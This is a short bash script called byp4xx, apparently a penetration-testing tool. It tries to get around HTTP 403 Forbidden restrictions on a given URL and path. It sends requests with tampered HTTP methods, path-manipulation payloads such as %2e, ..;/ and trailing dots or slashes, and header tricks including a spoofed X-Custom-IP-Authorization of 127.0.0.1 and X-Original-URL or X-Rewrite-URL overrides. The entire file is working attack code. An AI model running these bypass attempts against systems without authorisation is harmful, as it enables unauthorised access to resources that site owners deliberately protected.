#!/bin/bash
echo "Usage: ./byp4xx http(s)://url /path"
echo "----HTTP Verb Tampering----"
echo "Regular GET request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2)
echo "POST request: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "Content-Length:0" -X POST $1$2)
#echo "Regular HEAD request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X HEAD $1$2)
echo "Regular OPTIONS request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $1$2)
echo "Regular PUT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PUT $1$2)
#echo "Regular DELETE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X DELETE $1$2)
echo "Regular TRACE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACE $1$2)
echo "Regular TRACK request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACK $1$2)
echo "Regular CONNECT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X CONNECT $1$2)
echo "Regular PATCH request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PATCH $1$2)
echo
echo "----403 bypass methods----"
echo "%2e payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1/%2e$2)
echo "/. payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$1$2/.")
echo "? payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2?)
echo "?? payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2??)
echo "// payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1/$2//)
echo "/./ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$1/.$2/./")
echo "/ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2/)
echo "/.randomstring payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$1$2/".randomstring)
echo "..;/ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$1$2..;/")
echo "Referer payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "Referer: $1$2" -X GET "$1$2")
echo "X-Custom-IP-Authorization+..;/ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$1$2..;/")
echo "X-Original-URL payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: $2" -X GET $1/anything)
echo "X-Rewrite-URL payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Rewrite-URL: $2" -X GET "$1/")
